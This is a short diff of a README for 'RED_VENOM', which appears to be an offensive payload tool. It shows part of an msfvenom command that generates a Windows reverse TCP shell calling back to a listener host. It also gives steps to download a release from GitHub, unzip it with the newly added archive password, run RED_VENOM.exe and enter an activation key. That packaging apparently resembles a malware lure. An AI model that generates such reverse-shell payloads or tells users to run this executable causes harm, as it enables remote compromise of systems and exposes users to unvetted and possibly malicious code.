@@ -118,14 +118,14 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 EXITFUN
 
 You can download the latest official release of **RED_VENOM** from the link below:
 
-🔗 [**Download Red_Venom (Latest Version)**](https://github.com/Y-JANBOUBI/Rrd_Venom/releases/download/v1.0/Red_Venom.7z)
+🔗 [**Download Red_Venom (Latest Version)**](https://github.com/Y-JANBOUBI/Rrd_Venom/releases/download/v1.0/Red_Venom.7z) 
 
 ---
 
 ### 🧪 Getting Started
 
 1. Download `RED_VENOM` from the link above.
-2. Unzip and Launch `RED_VENOM.exe`.
+2. Unzip and Launch `RED_VENOM.exe`. Password: `Red_Venom` 
 3. When prompted, enter your **activation key**.
 4. Once activated, the tool will run normally on your device.
 ---
